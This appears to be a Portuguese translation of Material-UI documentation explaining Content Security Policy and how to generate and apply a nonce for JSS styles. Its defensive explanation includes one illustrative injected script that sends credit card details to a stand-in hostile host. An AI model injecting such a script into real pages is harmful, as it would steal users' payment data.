# Política de segurança de conteúdo (CSP)

<p class="description">Material-UI suporta cabeçalhos de política de segurança de conteúdo.</p>

## O que é CSP e por que é útil?

Basicamente, o CSP reduz os ataques de cross-site scripting (XSS) exigindo que os desenvolvedores incluam na whitelist as fontes de onde seus assets são recuperados. Esta lista é retornada como um cabeçalho do servidor. Por exemplo, digamos que você tenha um site hospedado em `https://example.com` o cabeçalho CSP `default-src: 'self';` permitirá todos os assets localizados em `https://example.com/*` e negar todos os outros. Se houver uma seção do seu site que é vulnerável ao XSS, onde a entrada do usuário de unescaped é exibida, um invasor pode inserir algo como:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

Esta vulnerabilidade permitiria que o invasor executasse qualquer coisa. No entanto, com um cabeçalho CSP seguro, o navegador não carregará esse script.

Você pode ler mais sobre o CSP [aqui](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Como se implementa o CSP?

Para usar o CSP com Material-UI (e JSS), você precisa usar um nonce. Um nonce é uma string gerada aleatoriamente que é usada apenas uma vez, portanto, você precisa adicionar um middleware de servidor para gerar um em cada solicitação. JSS tem um [ótimo tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) sobre como conseguir isso com Express and React Helmet. Para um resumo básico, continue lendo.

Um nonce CSP é uma string codificada na Base 64. Você pode gerar um assim:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

É muito importante que você use o UUID versão 4, pois ele gera uma string **imprevisível**. Em seguida, você aplica esse nonce ao cabeçalho do CSP. Um cabeçalho CSP pode ser assim com o nonce aplicado:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Se você estiver usando renderização do lado do servidor(Server-Side Rendering), deverá passar o nonce na tag `<style>` no servidor.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Então, você deve passar este nonce para o JSS para que ele possa adicioná-lo às tags `<style>` subsequentes. O lado do cliente obtém o nonce de um cabeçalho. Você deve incluir esse cabeçalho independentemente de o SSR ser usado ou não.

```jsx
<meta property="csp-nonce" content={nonce} />
```